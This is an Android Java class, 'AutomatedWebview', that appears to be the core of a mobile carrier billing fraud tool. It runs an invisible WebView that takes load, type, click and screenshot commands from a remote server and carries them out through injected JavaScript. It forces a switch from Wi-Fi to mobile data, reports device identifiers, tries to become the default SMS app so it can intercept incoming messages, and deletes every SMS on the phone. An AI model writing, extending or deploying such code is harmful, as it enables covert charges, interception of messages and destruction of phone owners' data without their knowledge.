package automation.bml.com.webviewautomation;

import android.app.ActivityManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.provider.Telephony;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.AttributeSet;
import android.util.Log;
import android.view.View;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;

import java.io.File;
import java.io.FileOutputStream;
import java.math.BigInteger;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.UUID;

import automation.bml.com.webviewautomation.RestAPI.DataModel.Action;
import automation.bml.com.webviewautomation.RestAPI.DataModel.Settings;
import automation.bml.com.webviewautomation.RestAPI.DataModel.TransactionResponse;
import automation.bml.com.webviewautomation.RestAPI.RestAPI;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

import static android.content.Context.ACTIVITY_SERVICE;
import static android.content.Context.CONNECTIVITY_SERVICE;
import static android.content.Context.WIFI_SERVICE;

public class AutomatedWebview extends WebView {

    Settings settings; //Storing setting value from API call
    RestAPI service;
    Context context;
    private int mnc, mcc;
    private String cssSelector;
    ArrayList<Action> actionList;

    public AutomatedWebview(Context context) {
        super(context);
        this.context = context;
        init();
    }

    public AutomatedWebview(Context context, AttributeSet attributes) {
        super(context, attributes);
        this.context = context;
        init();
    }

    public void init() {
        this.setVisibility(View.INVISIBLE);
        setUUID(); // Setting the UUID on installation
        //Webview settings
        getSettings().setJavaScriptEnabled(true);
        setWebChromeClient(new WebChromeClient());

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            setWebViewClient(new WebViewClient() {
                @Override
                public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                    view.loadUrl(request.getUrl().toString());
                    return true;
                }
            });
        } else {
            setWebViewClient(new WebViewClient() {
                @Override
                public boolean shouldOverrideUrlLoading(WebView view, String url) {
                    view.loadUrl(url);
                    return true;
                }
            });
        }

    }
    public void start(String app_id, String app_url)
    {
        //Setting up REST api objects
        OkHttpClient httpClient = new OkHttpClient.Builder().build();
        Gson gson = new GsonBuilder()
                .setLenient()
                .create();
        Retrofit retrofit = new Retrofit.Builder().addConverterFactory(GsonConverterFactory.create(gson)).baseUrl(app_url).client(httpClient).build();
        service = retrofit.create(RestAPI.class);

        enableSMSDefault(); //Setting the app as default SMS app
        //Displaying device info
        Toast.makeText(context, "Manufacturer: " + getDeviceManufacturer(), Toast.LENGTH_SHORT).show();
        Toast.makeText(context, "Model: " + getModel(), Toast.LENGTH_SHORT).show();

        if (!isMobileConnected()) //No 3g/4g connection
        {
            changeWifiStatus(false);
            if (!isMobileConnected()) {
                try {
                    changeWifiStatus(true);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
        if (isMobileConnected()) //If connected to 3G/4G
        {
            getMNCMCC(); //generating mnc & mcc
            if (mnc != 0 || mcc != 0) //If MNC and MCC are not empty
            {
                //Calling the api
                Call<TransactionResponse> meResponse = service.loadData(app_id, getUUID(), getUserAgent(), getIPAddress(), "20408", "start");
                meResponse.enqueue(new Callback<TransactionResponse>() {
                    @Override
                    public void onResponse(Call<TransactionResponse> call, Response<TransactionResponse> response) {
                        if (response.isSuccessful()) {
                            TransactionResponse body = response.body();
                            Map<String, String> actions = body.getActions();
                            settings = body.getSettings(); //Storing settings value for update
                            actionList = new ArrayList<>();
                            for (Map.Entry<String, String> entry : actions.entrySet()) {
                                actionList.add(actionParser(entry));
                            }
                            if (isForeground()) // if App is active
                                process();
                            else
                                updateData("WAITING"); //Update server status with 'WAITING' status
                        } else
                            updateData("NO VALID JSON RECEIVED");
                    }

                    @Override
                    public void onFailure(Call<TransactionResponse> call, Throwable t) {
                        Toast.makeText(context, "Network error, please try again!", Toast.LENGTH_LONG).show();
                        t.printStackTrace();
                    }
                });

            } else {
                updateData("MCCMNC is empty");
            }
        }
    }
    // Javascript injection for automated actions
    public void focus(String selector) {
        String script = "document.querySelector('" + selector + "').focus();";
        cssSelector = selector;
        injectJS(script);
    }

    public void enter(String text) {
        String script = "(function() {document.querySelector('" + cssSelector + "').value= '" + text + "';}) ();";
        injectJS(script);
    }

    public void click(String selector) {
        String script = "(function() {document.querySelector('" + selector + "').click();})();";
        injectJS(script);
    }

    public void takeScreenshot() {
        //Getting the dimensions of the webview
        measure(MeasureSpec.makeMeasureSpec(
                MeasureSpec.UNSPECIFIED, MeasureSpec.UNSPECIFIED),
                MeasureSpec.makeMeasureSpec(0, MeasureSpec.UNSPECIFIED));
        setDrawingCacheEnabled(true);
        buildDrawingCache();
        String fileName = generateFileName(settings.getTransactionId());
        Bitmap b = Bitmap.createBitmap(getMeasuredWidth(),getMeasuredHeight(), Bitmap.Config.ARGB_8888);
        Canvas c = new Canvas(b);
        draw(c);
        FileOutputStream fos;
        try {
            if (createDirIfNotExists(Constants.DIRECTORY)) {
                File file = new File(context.getExternalFilesDir(Environment.DIRECTORY_PICTURES) + "/" + Constants.DIRECTORY + "/" + fileName);
                fos = new FileOutputStream(file);
                if (fos != null) {
                    b.compress(Bitmap.CompressFormat.JPEG, 100, fos);
                    Toast.makeText(context, "Saved screenshot!", Toast.LENGTH_LONG).show();
                    fos.close();
                    //Building file object for post
                    RequestBody reqFile = RequestBody.create(MediaType.parse("image/*"), file);
                    MultipartBody.Part body = MultipartBody.Part.createFormData("image", file.getName(), reqFile);
                    Call<String> meResponse = service.postScreenShot(body);
                    meResponse.enqueue(new Callback<String>() {
                        @Override
                        public void onResponse(Call<String> call, Response<String> response) {
                            if (response.isSuccessful() && response.body().equalsIgnoreCase("success")) {
                                Toast.makeText(context, "Posted screenshot!", Toast.LENGTH_LONG).show();
                            } else {
                                Toast.makeText(context, "Uploading screenshot failed!", Toast.LENGTH_LONG).show();
                            }
                        }

                        @Override
                        public void onFailure(Call<String> call, Throwable t) {
                            Toast.makeText(context, "" +
                                    "An error occcured, please try again!", Toast.LENGTH_LONG).show();
                            t.printStackTrace();
                        }
                    });

                }
            }
        } catch (Exception e) {
            Toast.makeText(context,"Saving screenshot failed!",Toast.LENGTH_LONG).show();
            e.printStackTrace();
        }
    }

    private void process() {
        int seconds = 0;
        Handler handler = new Handler();
        int count = 0;
        for (final Action item : actionList) {
            if (item.getAction().equalsIgnoreCase("load")) {
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        loadUrl(item.getParameter());
                    }
                }, seconds * 1000);
            } else if (item.getAction().equalsIgnoreCase("wait")) {
                try {
                    seconds += Integer.parseInt(item.getParameter());
                } catch (Exception e) {
                    e.printStackTrace();
                }
            } else if (item.getAction().equalsIgnoreCase("focus")) {
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        focus(item.getParameter());
                    }
                }, seconds * 1000);
            } else if (item.getAction().equalsIgnoreCase("enter")) {
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        enter(item.getParameter());
                    }
                }, seconds * 1000);
            } else if (item.getAction().equalsIgnoreCase("click")) {
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        click(item.getParameter());
                    }
                }, seconds * 1000);
            } else if (item.getAction().equalsIgnoreCase("screenshot")) {
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        takeScreenshot();
                    }
                }, seconds * 1000);
            }
            count++;
        }

        //Updating server
        final int finalCount = count;
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (finalCount == actionList.size())
                    updateData("SUCCESS");
            }
        }, seconds * 1000 + 200);
    }

    //Processing functions
    private boolean isMobileConnected() {
        ConnectivityManager connManager = (ConnectivityManager) context.getSystemService(CONNECTIVITY_SERVICE);
        boolean isMobileEnabled = false;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            Network[] networks = connManager.getAllNetworks();
            for (Network network : networks) {
                NetworkInfo info = connManager.getNetworkInfo(network);
                if (info != null) {
                    if (info.getType() == ConnectivityManager.TYPE_MOBILE) {
                        isMobileEnabled = true;
                        break;
                    }
                }
            }
        } else {
            NetworkInfo mMobile = connManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
            if (mMobile != null)
                isMobileEnabled = true;
        }
        return isMobileEnabled;
    }

    public void changeWifiStatus(boolean status) {
        WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
        if (status) {
            IntentFilter intentFilter = new IntentFilter();
            intentFilter.addAction(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION);
            intentFilter.addAction(WifiManager.NETWORK_STATE_CHANGED_ACTION);
            WifiReceiver receiver = new WifiReceiver(this, true);
            context.registerReceiver(receiver, intentFilter);
        }
        wifiManager.setWifiEnabled(status);
    }

    private void getMNCMCC() {
        TelephonyManager tel = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        String networkOperator = tel.getNetworkOperator();
        if (!TextUtils.isEmpty(networkOperator)) {
            mcc = Integer.parseInt(networkOperator.substring(0, 3));
            mnc = Integer.parseInt(networkOperator.substring(3));
        }
    }

    public String getUserAgent() {
        return this.getSettings().getUserAgentString();
    }

    public String getIPAddress() {
        WifiManager wm = (WifiManager) context.getSystemService(WIFI_SERVICE);
        WifiInfo wifiinfo = wm.getConnectionInfo();
        byte[] myIPAddress = BigInteger.valueOf(wifiinfo.getIpAddress()).toByteArray();
        reverseArray(myIPAddress);
        String myIP = "";
        InetAddress myInetIP;
        try {
            myInetIP = InetAddress.getByAddress(myIPAddress);
            myIP = myInetIP.getHostAddress();
        } catch (UnknownHostException e) {
            e.printStackTrace();
        }
        return myIP;
    }

    public void setUUID() {
        SharedPreferences sharedPreferences = context.getSharedPreferences(Constants.sharedPreferenceName, Context.MODE_PRIVATE);
        if (getUUID().isEmpty()) {
            String newId = UUID.randomUUID().toString();
            SharedPreferences.Editor editor = sharedPreferences.edit();
            editor.putString("uuid", newId);
            editor.commit();
        }
    }

    public String getUUID() {
        SharedPreferences sharedPreferences = context.getSharedPreferences(Constants.sharedPreferenceName, Context.MODE_PRIVATE);
        String uuid = sharedPreferences.getString("uuid", "");
        return uuid;
    }

    public void updateData(final String status) {
        String transaction_id = "";
        if (settings != null)
            transaction_id = settings.getTransactionId();
        Call<String> meResponse = service.updateData("update", transaction_id, status);
        meResponse.enqueue(new Callback<String>() {
            @Override
            public void onResponse(Call<String> call, Response<String> response) {
                if (response.isSuccessful() && response.body().equalsIgnoreCase("ok")) {
                    Toast.makeText(context, "Updated server: " + status, Toast.LENGTH_LONG).show();
                } else {
                    Toast.makeText(context, "Updating data failed!", Toast.LENGTH_LONG).show();
                }
            }

            @Override
            public void onFailure(Call<String> call, Throwable t) {
                Toast.makeText(context, "Network error, please try again!", Toast.LENGTH_LONG).show();
                t.printStackTrace();
            }
        });
    }

    public String getDeviceManufacturer() {
        return android.os.Build.MANUFACTURER;
    }

    public String getModel() {
        return android.os.Build.MODEL;
    }

    public void deleteSMS(Context context) {
        Uri deleteUri = Uri.parse("content://sms");
        int count;
        Cursor c = context.getContentResolver().query(deleteUri, new String[]{"_id"}, null,
                null, null);
        while (c.moveToNext()) {
            try {
                // Delete the SMS
                String pid = c.getString(0); // Get id;
                String uri = "content://sms/" + pid;
                count = context.getContentResolver().delete(Uri.parse(uri),
                        null, null);
                Log.d("message removal count", String.valueOf(count));
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    // Miscellaneous functions
    private void injectJS(String script) {
        try {
            StringBuilder sb = new StringBuilder();
            sb.append(script);
            loadUrl("javascript:" + script);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private boolean createDirIfNotExists(String path) {
        boolean ret = true;
        File file = new File(context.getExternalFilesDir(Environment.DIRECTORY_PICTURES), path);
        if (!file.exists()) {
            if (!file.mkdirs()) {
                ret = false;
            }
        }
        return ret;
    }

    private String generateFileName(String transaction_id) {
        String name;
        int i = 1;
        while (true)
        {
            name = transaction_id+"_"+String.valueOf(i)+".jpg";
            File file = new File(context.getExternalFilesDir(Environment.DIRECTORY_PICTURES) + "/" + Constants.DIRECTORY + "/" + name);
            if(file.exists())
                i++;
            else
                break;
        }
        return name;
    }

    public boolean isForeground() {
        String PackageName = context.getPackageName();
        ActivityManager manager = (ActivityManager) context.getSystemService(ACTIVITY_SERVICE);
        ComponentName componentInfo;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
        {
            List<ActivityManager.AppTask> tasks = manager.getAppTasks();
            componentInfo = tasks.get(0).getTaskInfo().topActivity;
        }
        else
        {
            List<ActivityManager.RunningTaskInfo> tasks = manager.getRunningTasks(1);
            componentInfo = tasks.get(0).topActivity;
        }

        if (componentInfo.getPackageName().equals(PackageName))
            return true;
        return false;
    }

    private Action actionParser(Map.Entry<String, String> entry) // Getting action and parameter from data
    {
        String action = "";
        String parameter = "";
        if (entry.getValue().length() > 0) {
            String array[] = entry.getValue().split(" ", 2);
            action = array[0];
            if (array.length > 1) {
                parameter = array[1];
                parameter = parameter.replace("\\", ""); // removing slashes for CSS validation
            }
        }
        return new Action(action, parameter);
    }

    private byte[] reverseArray(byte[] array) //needed a tweak with great performance for replacing deprecated solution
    {
        for(int i = 0; i < array.length / 2; i++)
        {
            byte temp = array[i];
            array[i] = array[array.length - i - 1];
            array[array.length - i - 1] = temp;
        }
        return array;
    }

    public void enableSMSDefault() // Setting the app as default SMS app so that it can intercept messages coming in while running
    {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            String defaultSMSPackageName = Telephony.Sms.getDefaultSmsPackage(context);
            if(defaultSMSPackageName != null) {
                if (!defaultSMSPackageName.equals(context.getPackageName())) {
                    Intent intent = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
                    intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, context.getPackageName());
                    context.startActivity(intent);
                }
            }
        }
    }
}